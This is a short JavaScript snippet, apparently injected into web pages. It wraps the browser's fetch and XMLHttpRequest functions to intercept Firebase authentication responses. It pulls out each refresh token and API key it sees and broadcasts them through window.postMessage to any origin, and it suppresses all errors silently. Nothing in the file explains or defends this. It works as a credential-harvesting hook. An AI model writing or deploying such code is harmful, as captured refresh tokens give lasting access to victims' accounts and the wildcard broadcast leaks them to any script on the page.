(function() {
    function checkAndNotify(url, responseText) {
        try {
            if (typeof url === 'string' && 
                (url.includes('identitytoolkit.googleapis.com') || url.includes('securetoken.googleapis.com')) && 
                url.includes('key=')) {
                
                const data = JSON.parse(responseText);
                const refreshToken = data.refreshToken || data.refresh_token;
                
                if (data && refreshToken) {
                    let apiKey = '';
                    try {
                        const urlObj = new URL(url);
                        apiKey = urlObj.searchParams.get('key') || '';
                    } catch (e) {
                        // Fallback parsing if URL is relative or fails to parse
                        const match = url.match(/[?&]key=([^&#]+)/);
                        if (match) apiKey = match[1];
                    }
                    
                    window.postMessage({ 
                        type: 'FIREBASE_AUTH_INTERCEPTED', 
                        refreshToken: refreshToken, 
                        apiKey: apiKey 
                    }, '*');
                }
            }
        } catch (e) {}
    }

    // Hook window.fetch
    const origFetch = window.fetch;
    window.fetch = async function(...args) {
        const response = await origFetch.apply(this, args);
        try {
            const url = args[0] instanceof Request ? args[0].url : args[0];
            const clone = response.clone();
            clone.text().then(text => {
                checkAndNotify(url, text);
            }).catch(() => {});
        } catch (e) {}
        return response;
    };

    // Hook XMLHttpRequest
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        return origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function() {
        this.addEventListener('load', function() {
            try {
                checkAndNotify(this._url, this.responseText);
            } catch (e) {}
        });
        return origSend.apply(this, arguments);
    };
})();
